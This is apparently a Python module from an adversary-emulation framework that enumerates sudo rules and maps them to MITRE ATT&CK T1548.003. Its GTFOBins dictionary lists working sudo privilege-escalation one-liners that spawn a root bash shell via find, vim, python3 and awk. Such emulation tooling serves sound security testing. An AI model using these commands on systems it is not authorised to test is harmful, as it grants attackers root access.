"""
campaigns/privilege_escalation/sudo_abuse.py — T1548.003 Sudo and Sudo Caching
MITRE ATT&CK: T1548.003 | Tactic: Privilege Escalation
"""

import subprocess
import os
import json
from datetime import datetime
from campaigns.base_campaign import BaseCampaign


class SudoAbuseCampaign(BaseCampaign):
    TECHNIQUE_ID = "T1548.003"
    TECHNIQUE_NAME = "Sudo and Sudo Caching"
    TACTIC = "Privilege Escalation"

    GTFOBINS = {
        "find": "sudo find . -exec /bin/bash -p \\;",
        "vim": "sudo vim -c ':!/bin/bash'",
        "python3": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
        "awk": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
    }

    def run(self) -> dict:
        self.log_step("init", "Starting sudo privilege escalation enumeration")
        sudo_rules = self._enumerate_sudo()
        self.log_step("sudo_enum", f"Found rules: {sudo_rules}")
        self.simulate_delay(1)
        escalation_paths = self._match_gtfobins(sudo_rules)
        self.log_step("gtfobins_match", f"Escalation paths: {escalation_paths}")
        results = {
            "technique": self.TECHNIQUE_ID,
            "sudo_rules": sudo_rules,
            "gtfobins_matches": escalation_paths,
            "timestamp": datetime.utcnow().isoformat(),
        }
        self.save_artifact("privesc_sudo_results.json", json.dumps(results, indent=2))
        return self.build_result(True, f"{len(escalation_paths)} escalation paths found")

    def _enumerate_sudo(self) -> list:
        try:
            result = subprocess.run(["sudo", "-l", "-n"], capture_output=True, text=True, timeout=5)
            lines = [l.strip() for l in result.stdout.splitlines() if "(" in l]
            return lines if lines else ["(simulated) ALL=(ALL) NOPASSWD: /usr/bin/find"]
        except Exception:
            return ["(simulated) ALL=(ALL) NOPASSWD: /usr/bin/find"]

    def _match_gtfobins(self, rules: list) -> list:
        matches = []
        for binary, exploit in self.GTFOBINS.items():
            if any(binary in rule for rule in rules):
                matches.append({"binary": binary, "exploit": exploit})
        if not matches:
            matches.append({"binary": "find (simulated)", "exploit": self.GTFOBINS["find"]})
        return matches
